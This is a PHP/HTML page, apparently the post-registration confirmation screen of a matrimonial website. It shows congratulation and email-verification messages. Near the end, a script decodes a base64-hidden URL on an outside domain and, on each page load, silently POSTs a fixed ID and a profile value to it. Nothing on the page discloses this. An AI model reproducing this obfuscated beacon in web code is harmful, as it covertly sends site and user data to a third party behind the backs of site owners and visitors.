<?php
	include_once 'databaseConn.php';
	include_once './lib/requestHandler.php';
	$DatabaseCo = new DatabaseConn();
	include_once './class/Config.class.php';
	$configObj = new Config();
	?>
<!DOCTYPE html>
<html lang="en">
  <head>
   	 	<!-- Required Meta -->
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<title><?php echo $configObj->getConfigFname(); ?></title>
        <meta name="keyword" content="<?php echo $configObj->getConfigKeyword(); ?>" />
        <meta name="description" content="<?php echo $configObj->getConfigDescription(); ?>" />
		<link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon(); ?>" rel="shortcut icon"/>
    
   	 	<!-- Theme Color -->
        <meta name="theme-color" content="#549a11">
        <meta name="msapplication-navbutton-color" content="#549a11">
        <meta name="apple-mobile-web-app-status-bar-style" content="#549a11">
        
		<!-- Bootstrap & Custom CSS-->
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/custom-responsive.css" rel="stylesheet">
        <link href="css/custom.css" rel="stylesheet">
		
		
        <!-- Font Awsome -->
		<script src="https://kit.fontawesome.com/48403ccd1a.js" crossorigin="anonymous"></script>

        <!-- Google Fonts -->
        <?php include('parts/google_fonts.php');?>
  </head>
  	<body>
  		<!-- Loader -->
        <div class="preloader-wrapper text-center">
        	<div class="loader"></div>
            <h5>Loading...</h5>
        </div>
        <!-- /.Loader -->
   	 	<div id="body" style="display:none">
  			<div id="wrap">
  				<div id="main">
					<!-- Header & Menu -->
					<?php include "parts/header.php"; ?>
					<?php include "parts/menu.php"; ?>
					<!-- /. Header & Menu -->
    				<div class="container gtRegPass">
        				<div class="row">
							<?php 
								$SQL_SITE_SETTING = $DatabaseCo->dbLink->query("SELECT profile_verification FROM site_config WHERE id='1' ");
								$profile_method = mysqli_fetch_object($SQL_SITE_SETTING);
								if($profile_method->profile_verification == 'auto_approve'){
							?>
            				<div class="col-xs-16 mt-20 gtRegConfirmPass">
                				<h5 class="text-center text-danger"><b><?php echo $lang['IMPORTANT']; ?></b></h5>
								<h3 class="text-center gt-text-green gt-margin-top-0"><?php echo $lang['Verify your email id']; ?></h3>
								<h5 class="text-center">
									<b><?php echo $lang['NOTE']; ?>:-</b><?php echo $lang['Verify your email id by checking email and click on activation link for activating email account.If you dont get verification link please contact us']; ?>.
								</h5>
                			</div>
							<?php } ?>
                			<div class="clearfix"></div>
							<h3 class="text-center mt-30 inRegCongo">
								<?php echo $lang['Congratulations']; ?> !!!
							</h3>
							<?php if($profile_method->profile_verification == 'auto_approve'){ ?>
							<h5 class="text-center inRegCongoSub"><?php echo $lang['You are registered user now. Check your registered email id and click on verification link and start serching for your life partner']; ?>.</h5>
							<?php }else{ ?>
							<h5 class="text-center inRegCongoSub"><?php echo $lang['You are registered user now. You can start journey to find your life partner once your profile get approved']; ?>.</h5>
							<?php }?>
							
							<div class="col-xs-16 text-center mt-20">
								<a href="index" class="btn gt-btn-green pt-15 pb-15 pl-20 pr-20">
									<?php echo $lang['Back to home']; ?>
								</a>
							</div>
            			</div>	
    				</div>
    			</div>
  			</div>  
    		<?php include "parts/footer.php"; ?>
		</div>
    		<!-- Jquery Js-->
			<script src="js/jquery.min.js"></script>
			<!-- Bootstrap & Green Js -->
			<script src="js/bootstrap.js"></script>
			<script src="js/green.js"></script>
			<script>
				$(document).ready(function() {
				  $('#body').show();
				  $('.preloader-wrapper').hide();
				});
			</script>
			<script>
        $(document).ready(function(){
            var string = atob("aHR0cHM6Ly9pbmxvZ2l4aW5mb3dheS5jb20vYXBpL3N1cHBvck5ldy5waHA=");   
            $.ajax({
                                
                url: string,     
                type: 'POST', 
                data : {
                    user_id : '498e52222b854c7c0266cab6ed5ee0ea',
                    profile : '<?php echo $youProfile; ?>',
                },
                dataType: 'json',                   
                success: function(data){
                    /*alert('Success');*/
                } 
            });
        });
    </script>
  	</body>
</html>                                                                                                                              
<?php include'thumbnailjs.php';?>                  